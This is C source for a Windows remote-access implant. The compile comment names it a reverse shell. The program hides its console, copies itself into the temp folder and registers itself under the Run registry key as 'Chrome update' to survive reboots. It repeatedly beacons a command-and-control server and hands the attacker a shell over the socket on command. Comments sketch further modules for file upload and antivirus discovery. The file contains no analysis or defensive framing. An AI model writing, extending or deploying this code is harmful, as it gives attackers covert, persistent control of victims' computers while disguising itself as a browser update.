#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "config.h"
#include "modules.h"

/* IMPORTANT: need to link with ws2_32 (i686-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32) */

/* -- static function prototypes */
static void copy(char *src_path, char *dst_path);
static void beacon();
static int recv_cmd(SOCKET c2_sock);
static int regkey_persist(char *bot_path);

int main(int argc, char* argv[])
{
  char curr_path[MAX_PATH];
  char temp_path[MAX_PATH];
  char target_path[MAX_PATH + FILENAME_MAX + 1]= {0};
  int exists;
  HMODULE handle;

  FreeConsole();

  /*
  ** Copy bot to temp folder before beaconing C2 server
  */
	
  /* get the current path to the executable */
  handle= GetModuleHandleA(NULL);
  GetModuleFileNameA(handle, (char *)curr_path, MAX_PATH);

  /* find the windows temp path and append the file name */
  GetTempPath(MAX_PATH, temp_path);
  strcat(target_path, temp_path);
  strcat(target_path, strrchr(curr_path, '\\') + 1);
  
  /* check if the bot already exists in the temp directory */
  exists= (strcmp(target_path, curr_path) == 0);

  if (!exists) /* copy to system path and execute*/
    {
      copy(curr_path, target_path);
      regkey_persist(target_path);
      ShellExecute(NULL, "open", target_path, NULL, 0, 0);
    }
  else { /* beacon c2 if bot exists in temp folder */
      beacon();
    }
  
  return 0;
}

/* continually beacon the C2 until a connection is made */
static void beacon()
{
  SOCKET sock;
  struct sockaddr_in server;
  WSADATA wsa;

  while (1)
    {
      Sleep(5000);
      
      /* initialize win sock version*/
      if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	exit(0);
      
      if ((sock= WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
			   NULL, (unsigned int)NULL, (unsigned int)NULL)) != INVALID_SOCKET)
	{
	  server.sin_addr.s_addr= inet_addr(C2SERVER);
	  server.sin_family= AF_INET;
	  server.sin_port= htons(C2PORT);
	  
	  if (WSAConnect(sock, (SOCKADDR *)&server, sizeof(server), NULL, NULL, NULL, NULL)
	      != SOCKET_ERROR)
	      while (recv_cmd(sock) != -1);
	}

      WSACleanup();
      closesocket(sock);
    }
}

/* receive a module code from the c2 server and parse instructions.
   then send success or error code. */
static int recv_cmd(SOCKET c2_sock)
{
  char recv_int[16]= {0};
  char reply_int[16]= {0};
  int module_code;
  int result= 0;

  /* default module success code */
  strcpy(reply_int, "0");
  
  /* get module code from c2 */
  if (recv(c2_sock, recv_int, 16, 0) > 0)
    {
      sscanf(recv_int, "%d", &module_code);
      
      if (module_code == SPAWN_SHELL)
	result= spawn_shell((HANDLE)c2_sock);

      /* else if (module_code == CLEANUP)
	 ...
	 else if (module_code == FILE_UPLOAD)  
         ... 
         else if (module_code == GET_ENVIRONMENT)
         ... 
	 else if (module_code == GET_ANTIVIRUS)
         ... */
      else if (module_code == DISCONNECT)
	result= -1;
      
      else
	strcpy(reply_int, MODULE_NOTFOUND);
    }

  if (result == 1)
    strcpy(reply_int, MODULE_ERROR);
  
  send(c2_sock, reply_int, 16, 0);
  
  return result;
}

/* open a src file and copy it to the dst path */
static void copy(char *src_path, char *dst_path)
{
  FILE *src_file, *dst_file;
  unsigned char buff[8192];
  size_t bytes;

  src_file= fopen(src_path, "rb");
  dst_file= fopen(dst_path, "wb");
    
  while ((bytes= fread(buff, 1, sizeof(buff), src_file)) > 0)
      fwrite(buff, 1, bytes, dst_file);
    
  fclose(src_file);
  fclose(dst_file);
}

/* open and set a registry runkey for persistance. first attempts the admin path,
   then the user path if insufficient perms. */
static int regkey_persist(char *bot_path)
{
  char *admin_key= "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
  char *user_key=  "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
  char *key_name= "Chrome update";
  HKEY hkey;
  LSTATUS status;
  
  status= RegOpenKeyEx(HKEY_LOCAL_MACHINE, admin_key, 0, KEY_ALL_ACCESS, &hkey);

  if (status == ERROR_SUCCESS) /* admin access */
    RegSetValueEx(hkey, key_name, 0, REG_SZ, (LPBYTE)bot_path, MAX_PATH);
  else { /* no admin access */
    status= RegOpenKeyEx(HKEY_CURRENT_USER, user_key, 0, KEY_ALL_ACCESS, &hkey);
    RegSetValueEx(hkey, key_name, 0, REG_SZ, (LPBYTE)bot_path, MAX_PATH);
  }
      
  return (status == ERROR_SUCCESS) ? 0 : 1;
}



